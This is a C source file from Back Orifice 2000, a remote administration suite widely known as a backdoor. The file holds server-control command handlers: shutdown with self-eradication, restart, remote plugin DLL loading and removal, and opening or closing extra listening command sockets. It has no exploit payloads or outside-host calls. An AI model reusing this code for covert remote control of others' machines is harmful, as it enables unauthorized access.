/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_serverctrl.h>
#include<plugins.h>
#include<dll_load.h>
#include<main.h>
#include<config.h>
#include<strhandle.h>

int CmdProc_ShutdownServer(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(lstrcmpi(svArg2,"delete")==0) {
		g_bEradicate=TRUE;
		IssueAuthCommandReply(cas_from, comid, 1, ">>Eradicating BO2K server<<\n");
	}

	IssueAuthCommandReply(cas_from, comid, 0, "Shutting down BO2K server.\n");
	
	g_bBO2KFinished=TRUE;
	g_bRestart=FALSE;
	return 0;
}

int CmdProc_RestartServer(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(svArg2==NULL) {
		g_svRestartProcess[0]='\0';
	} else {
		lstrcpyn(g_svRestartProcess,svArg2,64);
	}

	IssueAuthCommandReply(cas_from, comid, 0, "Restarting BO2K server.\nYou will need to reconnect.\n");
	
	g_bBO2KFinished=TRUE;
	g_bRestart=TRUE;
	return 0;
}

int CmdProc_LoadPluginDll(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	HANDLE hFile=CreateFile(svArg2,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't open plugin dll.\n");
		return -1;
	}
	BY_HANDLE_FILE_INFORMATION bhfi;

	GetFileInformationByHandle(hFile,&bhfi);

	void *buf=malloc(bhfi.nFileSizeLow);
	if(buf==NULL) {
		CloseHandle(hFile);
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return -1;
	}

	DWORD dwBytes;
	ReadFile(hFile,buf,bhfi.nFileSizeLow,&dwBytes,NULL);

	if(AddPlugin(buf,bhfi.nFileSizeLow)==-1) {
		CloseHandle(hFile);
		free(buf);
		IssueAuthCommandReply(cas_from,comid,0,"Plugin could not be added.\n");
		return -1;
	}

	CloseHandle(hFile);
	free(buf);
	
	IssueAuthCommandReply(cas_from,comid,2,"Plugin added successfully.\n");
	return 0;
/*
	if(DebugPlugin(svArg2)==-1) {
		IssueAuthCommandReply(cas_from,comid,0,"Plugin could not be added.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,2,"Plugin added successfully.\n");
	return 0;*/
}

int CmdProc_DebugPluginDll(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(DebugPlugin(svArg2)==-1) {
		IssueAuthCommandReply(cas_from,comid,0,"Plugin could not be added.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,2,"Debug plugin added successfully.\n");
	return 0;
}

int CmdProc_ListPluginDlls(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	HMODULE hDLL;
	int num;

	IssueAuthCommandReply(cas_from,comid,1,"Plugin List\n");
	
	num=0;
	hDLL=GetPlugin(num);
	while(hDLL!=NULL) {
		char svLine[1024];
		PLUGIN_VERSION pv;

		TYPEOF_PluginVersion *PluginVersion=(TYPEOF_PluginVersion *)GetDLLProcAddress(hDLL,"PluginVersion");
		PluginVersion(&pv);

		wsprintf(svLine,"%2d: %.256s (%.512s)\n",num,pv.svFilename,pv.svDescription);
		IssueAuthCommandReply(cas_from,comid,1,svLine);

		num++;
		hDLL=GetPlugin(num);
	}

	IssueAuthCommandReply(cas_from,comid,0,"End Of Plugin List\n");
	
	return 0;
}

int CmdProc_RemovePluginDll(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	void *ptr;

	ptr=GetPlugin(nArg1);
	if(ptr==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Invalid plugin number.\n");
		return -1;	
	}

	if(RemovePlugin(nArg1)==-1) {	
		IssueAuthCommandReply(cas_from,comid,0,"Plugin could not be removed\n");
		return -1;
	}
	
	IssueAuthCommandReply(cas_from,comid,2,"Plugin removed successfully.\n");	
	return 0;
}

int CmdProc_StartCommandSocket(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{	
	char *svBindStr=GetCfgStr(g_szStartupOptions,"Init Cmd Bind Str");
	char *svNetMod=GetCfgStr(g_szStartupOptions,"Init Cmd Net Type");
	char *svEnc=GetCfgStr(g_szStartupOptions,"Init Cmd Encryption");
	char *svAuth=GetCfgStr(g_szStartupOptions,"Init Cmd Auth");
	char *svParam;

	svParam=svArg2;
	if(svParam!=NULL) {
		if(svParam[0]!='\0') svNetMod=svParam;
		svParam=BreakString(svNetMod,",");
		if(svParam!=NULL) {
			if(svParam[0]!='\0') svEnc=svParam;
			svParam=BreakString(svEnc,",");
			if(svParam!=NULL) {
				if(svParam[0]!='\0') svAuth=svParam;
			}
		}
	}

	if(svArg3!=NULL) {
		if(svArg3[0]!='\0') svBindStr=svArg3;
	}	

	CAuthSocket *pSock=ListenAuthSocket(NULL,cas_from->GetUserID(),NULL,svBindStr,svNetMod,svEnc,svAuth);
	if(((int)pSock)>0 && g_nCommCount<MAX_COMMAND_SOCKETS) {
		g_pCommSock[g_nCommCount]=pSock;
		g_nCommCount++;
		
		char svMsg[512],svAddr[256];
		pSock->GetConnectAddr(svAddr,256);
		wsprintf(svMsg, "Command socket #%d created on: %.256s\n",g_nCommCount-1,svAddr);
		IssueAuthCommandReply(cas_from,comid,0,svMsg);
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Error creating command socket.\n");
	}
	return 0;
}

int CmdProc_ListCommandSockets(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	int i;
	IssueAuthCommandReply(cas_from,comid,1,"Command Sockets:\n");
	for(i=0;i<g_nCommCount;i++) {
		char svMsg[512];
		char svAddr[256];
		CAuthSocket *pSock=g_pCommSock[i];
		pSock->GetConnectAddr(svAddr,256);
		wsprintf(svMsg,"%d: %.256s\n",i,svAddr);
		IssueAuthCommandReply(cas_from,comid,1,svMsg);
	}
	IssueAuthCommandReply(cas_from,comid,1,"End Command Socket List.\n");
	return 0;
}

int CmdProc_StopCommandSocket(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(nArg1>=0 && nArg1<(DWORD)g_nCommCount) {
		CAuthSocket *pSock=g_pCommSock[nArg1];
		if(pSock!=NULL) {
			memcpy(g_pCommSock+nArg1,g_pCommSock+nArg1+1, sizeof(CAuthSocket *) * (g_nCommCount-(nArg1+1)));
			g_nCommCount--;
			g_pCommSock[g_nCommCount]=NULL;
			if(pSock->Close()==0) {
				IssueAuthCommandReply(cas_from,comid,0,"Command socket closed.\n");
				return 0;
			} else {
				IssueAuthCommandReply(cas_from,comid,0,"Command socket already closed.\n");
				return 0;
			}
		}
	} 
	IssueAuthCommandReply(cas_from,comid,0,"Command socketd does not exist.\n");
	return 0;
}